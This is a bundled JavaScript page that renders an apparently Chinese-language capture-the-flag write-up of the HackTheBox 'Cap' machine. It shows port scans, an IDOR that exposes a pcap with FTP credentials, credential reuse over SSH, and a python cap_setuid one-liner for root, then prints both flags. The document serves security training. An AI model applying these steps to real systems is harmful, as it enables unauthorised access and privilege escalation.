"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1075],{90366:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>d,contentTitle:()=>c,default:()=>h,frontMatter:()=>i,metadata:()=>t,toc:()=>l});const t=JSON.parse('{"id":"HackTheBox/Machines/Cap/index","title":"Cap","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/Cap/index.md","sourceDirName":"HackTheBox/Machines/Cap","slug":"/HackTheBox/Machines/Cap/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Cap/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Cap/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Bizness","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Bizness/"},"next":{"title":"Code","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Code/"}}');var a=s(74848),r=s(28453);const i={},c="Cap",d={},l=[{value:"Target IP Address",id:"target-ip-address",level:2},{value:"\u8d44\u4ea7\u63a2\u6d4b",id:"\u8d44\u4ea7\u63a2\u6d4b",level:2},{value:"Port 80 Web Service",id:"port-80-web-service",level:2},{value:"Port 21 FTP",id:"port-21-ftp",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"Port 22 SSH \u8106\u5f31\u51ed\u636e",id:"port-22-ssh-\u8106\u5f31\u51ed\u636e",level:2},{value:"\u63d0\u6743\u81f3root",id:"\u63d0\u6743\u81f3root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function o(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,r.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"cap",children:"Cap"})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsx)(n.p,{children:"Difficulty: Easy"}),(0,a.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,a.jsx)(n.h2,{id:"target-ip-address",children:"Target IP Address"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"10.10.10.245\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u8d44\u4ea7\u63a2\u6d4b",children:"\u8d44\u4ea7\u63a2\u6d4b"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.10.245\n......\nstart infoscan\n10.10.10.245:21 open\n10.10.10.245:22 open\n10.10.10.245:80 open\n[*] alive ports len is: 3\nstart vulscan\n[*] WebTitle http://10.10.10.245       code:200 len:19386  title:Security Dashboard\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap -vv --min-rate=2000 -A -p- 10.10.10.245\n......\nNmap scan report for bogon (10.10.10.245)\nHost is up, received echo-reply ttl 63 (0.15s latency).\nScanned at 2025-03-19 20:24:24 CST for 72s\nNot shown: 65532 closed tcp ports (reset)\nPORT   STATE SERVICE REASON         VERSION\n21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)\n| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=\n|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=\n|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH\n80/tcp open  http    syn-ack ttl 63 Gunicorn\n|_http-title: Security Dashboard\n| http-methods:\n|_  Supported Methods: OPTIONS HEAD GET\n|_http-server-header: gunicorn\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u76ee\u5f55\u7206\u7834"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ dirsearch -u 10.10.10.245\n[20:24:45] Starting:\n[20:25:54] 302 -  208B  - /data  ->  http://10.10.10.245/\n[20:25:54] 302 -  208B  - /data/adminer.php  ->  http://10.10.10.245/\n[20:25:54] 302 -  208B  - /data/autosuggest  ->  http://10.10.10.245/\n[20:25:57] 302 -  208B  - /download/history.csv  ->  http://10.10.10.245/\n[20:25:57] 302 -  208B  - /download/users.csv  ->  http://10.10.10.245/\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u663e\u7136\u6ca1\u6709\u6709\u4ef7\u503c\u4fe1\u606f"}),"\n",(0,a.jsx)(n.h2,{id:"port-80-web-service",children:"Port 80 Web Service"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(55279).A+"",width:"2560",height:"1371"})}),"\n",(0,a.jsx)(n.p,{children:"\u6ce8\u610f\u5230\u53f3\u4fa7\u5bfc\u822a\u680f\u6709\u4ee5\u4e0b\u529f\u80fd\u70b9"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"Dashboard"}),"\n",(0,a.jsx)(n.li,{children:"Security Snapshot (5 Second PCAP + Analysis)"}),"\n",(0,a.jsx)(n.li,{children:"IP Config"}),"\n",(0,a.jsx)(n.li,{children:"Network Status"}),"\n"]}),"\n",(0,a.jsx)(n.p,{children:"wappalyzer \u68c0\u6d4b\u5230\u7684\u6280\u672f\u6307\u7eb9\u5982\u4e0b"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(88028).A+"",width:"698",height:"746"})}),"\n",(0,a.jsxs)(n.p,{children:["\u5728 ",(0,a.jsx)(n.code,{children:"Security Snapshot (5 Second PCAP + Analysis)"})," \u9875\u9762\u4e2d\uff0c\u53d1\u73b0\u5176\u94fe\u63a5\u4e3a ",(0,a.jsx)(n.code,{children:"http://10.10.10.245/data/2"})]}),"\n",(0,a.jsxs)(n.p,{children:["\u5c1d\u8bd5\u5c06url\u4e2d\u7684\u53c2\u6570\u6362\u4e3a",(0,a.jsx)(n.code,{children:"0"}),"\u4e4b\u540e\uff0c\u5f97\u5230\u4e00\u4e2apcap\u6587\u4ef6\uff0c\u5728\u5176\u4e2d\u53d1\u73b0FTP\u767b\u5f55\u51ed\u636e"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(72592).A+"",width:"1984",height:"1408"})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"nathan:Buck3tH4TF0RM3!\n"})}),"\n",(0,a.jsx)(n.h2,{id:"port-21-ftp",children:"Port 21 FTP"}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u4f7f\u7528\u83b7\u5f97\u7684\u51ed\u636e\u8fdb\u884c\u767b\u5f55"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ ftp nathan@10.10.10.245\nConnected to 10.10.10.245.\n220 (vsFTPd 3.0.3)\n331 Please specify the password.\nPassword: \n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -lah\n229 Entering Extended Passive Mode (|||57378|)\n150 Here comes the directory listing.\ndrwxr-xr-x    3 1001     1001         4096 May 27  2021 .\ndrwxr-xr-x    3 0        0            4096 May 23  2021 ..\nlrwxrwxrwx    1 0        0               9 May 15  2021 .bash_history -> /dev/null\n-rw-r--r--    1 1001     1001          220 Feb 25  2020 .bash_logout\n-rw-r--r--    1 1001     1001         3771 Feb 25  2020 .bashrc\ndrwx------    2 1001     1001         4096 May 23  2021 .cache\n-rw-r--r--    1 1001     1001          807 Feb 25  2020 .profile\nlrwxrwxrwx    1 0        0               9 May 27  2021 .viminfo -> /dev/null\n-r--------    1 1001     1001           33 Mar 19 12:23 user.txt\n226 Directory send OK.\n"})}),"\n",(0,a.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",metastring:'title="/home/nathan/user.txt"',children:"928f862234737ca80c7ef76a8bdeb8cd\n"})}),"\n",(0,a.jsx)(n.h2,{id:"port-22-ssh-\u8106\u5f31\u51ed\u636e",children:"Port 22 SSH \u8106\u5f31\u51ed\u636e"}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528FTP\u7684\u51ed\u636e\u4e5f\u53ef\u4ee5\u767b\u5f55SSH"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u250c\u2500\u2500(randark\u327fkali)-[~]\n\u2514\u2500$ ssh nathan@10.10.10.245\n......\nnathan@cap:~$ whoami\nnathan\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u63d0\u6743\u81f3root",children:"\u63d0\u6743\u81f3root"}),"\n",(0,a.jsxs)(n.p,{children:["\u4e0a\u4f20",(0,a.jsx)(n.code,{children:"linpeass.sh"}),"\u81ea\u52a8\u5316\u63a2\u6d4b"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563 Searching tmux sessions\n\u255a https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions\ntmux 3.0a\n\n\n/tmp/tmux-1001\n\nFiles with capabilities (limited to 50):\n/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip\n/usr/bin/ping = cap_net_raw+ep\n/usr/bin/traceroute6.iputils = cap_net_raw+ep\n/usr/bin/mtr-packet = cap_net_raw+ep\n/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u53ef\u4ee5\u770b\u5230",(0,a.jsx)(n.code,{children:"/usr/bin/python3.8"}),"\u62e5\u6709\u6781\u5ea6\u654f\u611f\u7684\u80fd\u529b",(0,a.jsx)(n.code,{children:"cap_setuid"})]}),"\n",(0,a.jsx)(n.p,{children:"\u5c1d\u8bd5\u52a0\u4ee5\u5229\u7528"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) nathan@cap:/tmp$ /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'\nroot@cap:/tmp# whoami\nroot\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6210\u529f\u63d0\u6743\u81f3root\u7528\u6237"}),"\n",(0,a.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"e7ccd2bbb7475b1507a58608cb6d54db\n"})})]})}function h(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(o,{...e})}):o(e)}},55279:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250331-203119-55a518a72d9db1f26b02b454bf3a8f55.png"},88028:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250335-203556-936a180af7a50065bd7262b0bc48acd8.png"},72592:(e,n,s)=>{s.d(n,{A:()=>t});const t=s.p+"assets/images/image_20250351-205145-55aec6b71257ddb29db8ef3fb5e98f6f.png"},28453:(e,n,s)=>{s.d(n,{R:()=>i,x:()=>c});var t=s(96540);const a={},r=t.createContext(a);function i(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);